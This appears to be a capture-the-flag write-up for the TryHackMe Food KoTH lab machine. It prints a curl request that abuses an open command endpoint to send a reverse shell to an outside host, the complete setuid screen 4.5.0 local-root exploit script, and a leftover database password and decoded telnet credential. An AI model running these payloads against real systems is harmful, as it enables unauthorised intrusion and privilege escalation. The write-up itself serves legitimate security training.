## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Practice Food KoTH alone, to get familiar with KoTH!
This is room for one of the King of the Hill machines, FoodCTF. Capture the food and all the flags, while you're at it.

You can access the official writeup by clicking Options (top right) and then 'Writeups'.

This box was from the April 2020 KoTH rotation. It awards no points, as the current question system doesn't allow me to do this.
```
There are total 8 flags in this machine which we need to find out all

## IP-Address
```IP-Address
10.48.190.100
```

## Rust-Scan
```bash
$ rustscan -a 10.49.190.20 -b 450 -t 2000 --ulimit 5000 -- -e tun0 -sC -sV

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.49.190.20:22
Open 10.49.190.20:3306
Open 10.49.190.20:9999
Open 10.49.190.20:15065
Open 10.49.190.20:16109
Open 10.49.190.20:46969
```

### Important Ports
```bash
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:0c:0c:d9:5a:7d:be:e6:f4:3c:ed:10:51:49:4d:19 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKjhSBkXZSZMWPqxiPKa9BxFKoQC6ZhXkKFa28z6w3yLpDBuzZTKyzkoLBm0n8APmlqu9CxnHyVZEmZYwddFuj4FMuAyYNS4BHFg5xMtnKlJK2OKol6F+DRaV8S98FEz0uFaI5yR5PUUtFrByqF01ppr04/HHVvBQpoZDCUabPZRJiEtOi/a5fhBvYRMGJdlijUiee6AoWf4tOc6RPgzxHi2bkqWKyGqdTf26p22tHk0XgSgzQzSh8ABrODNzm04EZYd9+ZHupIo2/mRJGQlBMoVuCcbQpdQrpP/+ivVFiCM8kytrn5Z3ayu6bEslCsbSjvG5VCtAHe2U+q2bsrZ/l
|   256 17:ce:03:3b:bb:20:78:09:ab:76:c0:6d:8d:c4:df:51 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCe4ipBH4bCimLbh8uzN1ix9+rEVIPbFdICCeNBR/+lndHq94/4Ow0odFFBok3r8lFVaPUSTj8QJNES04lSe/sY=
|   256 07:8a:50:b5:5b:4a:a7:6c:c8:b3:a1:ca:77:b9:0d:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEnPlJ5lhNGmcnRSde/U2Jg6eHjsPIm08Z4fRBrjk2Qf
3306/tcp  open  mysql   syn-ack ttl 62 MySQL 5.7.29-0ubuntu0.18.04.1
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.29-0ubuntu0.18.04.1
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: SupportsTransactions, LongColumnFlag, Speaks41ProtocolOld, Support41Auth, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, InteractiveClient, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, LongPassword, Speaks41ProtocolNew, ODBCClient, FoundRows, SupportsCompression, SupportsLoadDataLocal, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: \x07%I\x1A''\x10]ZB\x12QW\x16\x7FJ\x16\x0B=[P
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.29_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-03-19T17:21:30
| Not valid after:  2030-03-17T17:21:30
| MD5:   a067:7d7d:a831:9979:e1d7:4ca7:1e2f:5319
| SHA-1: 5769:4d3d:4ff6:fce9:b4dd:1553:9799:9a97:0f1e:75e8
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjI5X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIwMDMxOTE3MjEzMFoXDTMwMDMxNzE3MjEzMFowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy4yOV9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCzxbl/o0Yu+SMlRxpsJBc1
| u96qvYHIdw0u+KeBECpkCm8Qa2hzfr317Ccm1e51djo+YWJl/tgljr/OqWlhutIJ
| g/IeNoSsFK2/JpevwX0JH8RFx2ZLS9wBU77xirWBHWCv2B8GZOmyAeF4mieIwzZc
| dGXIWGGfYRh9A7h5BPqxi3M1DnvE1Z8CbYNB76sEzh2xef9qCEVY3TObGPUTAUM6
| R6nlyZg7eS8/OcGM0nHEBoHn1qLzhZxuq6ybdPkM53SRMf4XRMYa91xSF9ok79IT
| ube+BDD5npRp/Ig+WPE29PFEipHVVxd30tDOVzRbmi1bM7g1P7M5DKq7/qg+hM7f
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAFEe95AD
| I593ZIX/I3cOeven7J+7RBeenYSscFVE6GZiP1F4pytK1Z7a8G5LrohcOecpqhAn
| kW0H1uLP3sSdRDN3a9+bDbYbrFocxByXWmHMV41KW+kPWCPbgRtMppCcgz/1LyDw
| +iKzANFQ371T311GguiX5+3Ke5HnerztjnQglXtL6KqiOBESoE9PqG4N+rJRyGY2
| vcjBRnYeYCAuEoHqhGgrNS4qoblttVu+3va09UeFh3P85fU7FwhCg8YTQiLzXFFU
| S9fUDr6qIbmoUyZSiFBcRJVOlmdzGd65KufpzwvjGgaj/CHS3BAHGhq+rxOq6vP4
| 0NYd9tFJyu3J2c8=
|_-----END CERTIFICATE-----
9999/tcp  open  http    syn-ack ttl 62 Golang net/http server
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sun, 21 Dec 2025 00:38:39 GMT
|     Content-Length: 4
|     Content-Type: text/plain; charset=utf-8
|     king
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
|_http-title: Site doesn''t have a title (text/plain; charset=utf-8).
|_http-favicon: Unknown favicon MD5: B2086154F101464AAB3328BA7E060DEB
15065/tcp open  http    syn-ack ttl 62 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Host monitoring
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
16109/tcp open  http    syn-ack ttl 62 Golang net/http server
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sun, 21 Dec 2025 00:38:39 GMT
|     Content-Type: image/jpeg
|     JFIF
|     #*%%*525EE\xff
|     #*%%*525EE\xff
|     $3br
|     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|     Y$?_
|     qR]$Oyk
|_    |$o.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn''t have a title (image/jpeg).
|_http-favicon: Unknown favicon MD5: D9F76C3AA8648CEC59E1539972C40EC5
46969/tcp open  telnet  syn-ack ttl 62 Linux telnetd
```

## MYSQL
They using default password
```bash
$ mysql -u root -p
Enter password: [password omitted]
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 809
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> show database;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'database' at line 1
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)
mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| User            |
+-----------------+
1 row in set (0.01 sec)
mysql> DESCRIBE User;
+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| username | varchar(255) | YES  |     | NULL    |       |
| password | varchar(255) | YES  |     | NULL    |       |
+----------+--------------+------+-----+---------+-------+
2 rows in set (0.00 sec)
mysql> SELECT * FROM User;
+----------+---------------------------------------+
| username | password                              |
+----------+---------------------------------------+
| ramen    | noodlesRTheBest                       |
| flag     | [flag omitted] |
+----------+---------------------------------------+
2 rows in set (0.00 sec)
mysql> 
```

got the credentials for `SSH` which we using later 
and credentials are 
```bash
Creds_SSH
$ssh ramen@10.49.176.59 
Pass - [password omitted]
```
## Telnet 
```bash
┌──(kali㉿kali)-[~]
└─$ telnet 10.48.190.100 46969            

Trying 10.48.190.100...
Connected to 10.48.190.100.
Escape character is '^]'.
tccr:uwjsasqccywsg
foodctf login: admin
Password: 
```

`tccr:uwjsasqccywsg` that part is cipher text `ROT13` which is decoded as  `food:givemecookies`

```bash
┌──(kali㉿kali)-[~]
└─$ telnet 10.48.190.100 46969            
Trying 10.48.190.100...
Connected to 10.48.190.100.
Escape character is '^]'.
tccr:uwjsasqccywsg
foodctf login: food
Password: [password omitted]
Last login: Sat Mar 21 00:20:49 UTC 2020 on tty1
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 14 09:45:30 UTC 2025

  System load:  0.0               Processes:           95
  Usage of /:   43.5% of 9.78GB   Users logged in:     0
  Memory usage: 33%               IP address for ens5: 10.48.190.100
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

food@foodctf:~$ whoami
-bash: whoami: No such file or directory
food@foodctf:~$ /bin/ls
food@foodctf:~$ /binls -la
-bash: /binls: No such file or directory
food@foodctf:~$ /bin/ls -la
total 40
drwxr-xr-x 5 food food 4096 Mar 30  2020 .
drwxr-xr-x 7 root root 4096 Mar 28  2020 ..
-rw-r--r-- 1 food food  220 Mar 19  2020 .bash_logout
-rw-r--r-- 1 food food 3771 Mar 19  2020 .bashrc
drwx------ 2 food food 4096 Mar 19  2020 .cache
-rw-rw-r-- 1 food food   38 Mar 28  2020 .flag
drwx------ 3 food food 4096 Mar 19  2020 .gnupg
drwxrwxr-x 3 food food 4096 Mar 19  2020 .local
-rw------- 1 food food   23 Mar 19  2020 .mysql_history
-rw-r--r-- 1 food food  815 Mar 28  2020 .profile
food@foodctf:~$ /bin/cat .flag
[flag omitted]
food@foodctf:~$ 
```

## First Flag
```Flag
[flag omitted]
```

## Fix the $Path
```bash
food@foodctf:~$ export PATH=/bin:/usr/bin:/sbin:/usr/sbin
food@foodctf:~$ 
food@foodctf:~$ ls
food@foodctf:~$ ls -la
total 40
drwxr-xr-x 5 food food 4096 Mar 30  2020 .
drwxr-xr-x 7 root root 4096 Mar 28  2020 ..
-rw-r--r-- 1 food food  220 Mar 19  2020 .bash_logout
-rw-r--r-- 1 food food 3771 Mar 19  2020 .bashrc
drwx------ 2 food food 4096 Mar 19  2020 .cache
-rw-rw-r-- 1 food food   38 Mar 28  2020 .flag
drwx------ 3 food food 4096 Mar 19  2020 .gnupg
drwxrwxr-x 3 food food 4096 Mar 19  2020 .local
-rw------- 1 food food   23 Mar 19  2020 .mysql_history
-rw-r--r-- 1 food food  815 Mar 28  2020 .profile
food@foodctf:~$ pwd
/home/food
food@foodctf:~$ cd ..
food@foodctf:/home$ ls
bread  food  pasta  ramen  tryhackme
food@foodctf:/home$ cd bread
food@foodctf:/home/bread$ ls -la
total 7900
drwxr-xr-x 6 bread bread    4096 Apr  6  2020 .
drwxr-xr-x 7 root  root     4096 Mar 28  2020 ..
-rw------- 1 bread bread       5 Apr  6  2020 .bash_history
-rw-r--r-- 1 bread bread     220 Mar 20  2020 .bash_logout
-rw-r--r-- 1 bread bread    3771 Mar 20  2020 .bashrc
drwx------ 2 bread bread    4096 Mar 20  2020 .cache
----r--r-- 1 bread bread      38 Mar 28  2020 flag
drwx------ 3 bread bread    4096 Mar 20  2020 .gnupg
drwxrwxr-x 3 bread bread    4096 Mar 20  2020 .local
-rwxrwxr-x 1 bread bread 8037916 Apr  6  2020 main
-rw-rw-r-- 1 bread bread    1513 Apr  6  2020 main.go
-rw-r--r-- 1 bread bread     825 Mar 28  2020 .profile
drwxrwxr-x 3 bread bread    4096 Apr  6  2020 resources
food@foodctf:/home/bread$ cat .bash_history 
cat: .bash_history: Permission denied
food@foodctf:/home/bread$ cat flag 
[flag omitted]
```

## Got The Second Flag 
```Flag
[flag omitted]
```

## Lateral Movement
got the `main.go` got this code in it
```go
food@foodctf:/home/bread$ cat main.go
package main

import (
        "flag"
        "fmt"
        "io/ioutil"
        "log"
        "mime"
        "net/http"
        "os"
        "os/exec"

        "github.com/gorilla/mux"
)

func main() {
        startServer()
}
func startServer() {
        portPtr := flag.Int("p", 15065, "Port number to run the server on")
        flag.Parse()
        port := *portPtr
        mr := mux.NewRouter()
        mr.NotFoundHandler = http.HandlerFunc(notFoundHandler)
        apiRouter := mr.PathPrefix("/api").Subrouter()
        go mime.AddExtensionType(".css", "text/css; charset=utf-8")
        go mime.AddExtensionType(".js", "application/javascript; charset=utf-8")
        //Setup a static router for HTML/CSS/JS
        mr.PathPrefix("/").Handler(http.StripPrefix("/", http.FileServer(http.Dir("./resources"))))
        //CRUD API routes
        apiRouter.HandleFunc("/cmd", commandHandler).Methods("POST")
        log.Println("Listening for requests")
        http.ListenAndServe(fmt.Sprintf(":%v", port), mr)
}
func runCommand(cmd string) string {
        result := exec.Command("/bin/bash", "-c", cmd)
        //log.Printf("%+q\n", result.String())
        result.Stderr = os.Stderr
        response, err := result.Output()
        if err != nil {
                return "ERROR:\t" + err.Error()
        }
        return string(response)
}
func commandHandler(w http.ResponseWriter, r *http.Request) {
        body, err := ioutil.ReadAll(r.Body)
        if err != nil {
                w.WriteHeader(500)
                return
        }
        bodyString := string(body)
        w.Write([]byte(runCommand(bodyString)))
}
func reqHandler(w http.ResponseWriter, r *http.Request) {
        w.WriteHeader(404)
}
func notFoundHandler(w http.ResponseWriter, r *http.Request) { //Handle 404s
        w.WriteHeader(404)
}
```
This Go server is **intentionally vulnerable**. It’s a textbook **unauthenticated Remote Command Execution (RCE)** challenge. `/api/cmd` = direct command execution, `/bin/bash -c` is shown in the code which leads to command execution
### cURLs
let use `cURLs` 
```bash
$ curl -X POST http://10.48.185.209:15065/api/cmd -d "id"
uid=1004(bread) gid=1004(bread) groups=1004(bread)
food@foodctf:/home/bread$ curl -X POST http://10.49.176.59:15065/api/cmd -d "sh -i >& /dev/tcp/192.168.142.60/4444 0>&1"
```

Got the Reverse shell
```bash
└─$ nc -lvnp 4444           
listening on [any] 4444 ...
connect to [192.168.142.60] from (UNKNOWN) [10.48.185.209] 55398
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
$
```

while scrolling into the server or system i found the fourth flag
```bash
bread@foodctf:/$ cd var
bread@foodctf:/var$ ls
backups  crash     lib    lock  mail  run   spool
cache    flag.txt  local  log   opt   snap  tmp
bread@foodctf:/var$ cat flag.txt
[flag omitted]
```

Now Lets Use `SSH` creds
```bash
$ ssh ramen@10.49.176.59 
ramen@10.49.176.59's password: [password omitted]
```
We didnt find anything else in this except the screen vulnerable version running on it
```bash
ramen@foodctf:~$ nano exploit
```

```sh
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

```bash
ramen@foodctf:~$ chmod +x exploit 
ramen@foodctf:~$ ./exploit 
```

Got the Root
```bash
#whoami
root
# cd /root
# ls
flag  king.txt  koth
# cat king.txt
king# cat flag
[flag omitted]
# cat /home/tryhackme/flag7
[flag omitted]
# cat .profile
# ~/.profile: executed by Bourne-compatible login shells.

if [ "$BASH" ]; then
  if [ -f ~/.bashrc ]; then
    . ~/.bashrc
  fi
fi

mesg n || true
alias wall="echo"
# [flag omitted]
# cat /var/log
cat: /var/log: Is a directory
# cd /var/log/
# ls
alternatives.log       faillog   unattended-upgrades vmware-vmsvc.1.log
apport.log        installer  vmware-network.1.log vmware-vmsvc.2.log
apt         journal   vmware-network.2.log vmware-vmsvc.3.log
auth.log        kern.log   vmware-network.3.log vmware-vmsvc.log
bootstrap.log        landscape  vmware-network.4.log vmware-vmsvc-root.1.log
btmp         lastlog   vmware-network.5.log vmware-vmsvc-root.2.log
cloud-init.log        lxd   vmware-network.6.log vmware-vmsvc-root.3.log
cloud-init-output.log  mysql   vmware-network.7.log vmware-vmsvc-root.log
dist-upgrade        syslog   vmware-network.8.log vmware-vmtoolsd-root.log
dpkg.log        tallylog   vmware-network.log wtmp
# cat auth.log 
[flag omitted]
```
Got All the Flags
## Flags
```Flags
1st Flag    =    [flag omitted] 
2nd Flag    =    [flag omitted]
3rd Flag    =    [flag omitted]
4th Flag    =    [flag omitted]
5rd Flag    =    [flag omitted]
6th Flag    =    [flag omitted]
7th Flag    =    [flag omitted]
8th Flag    =    [flag omitted]
```

# END
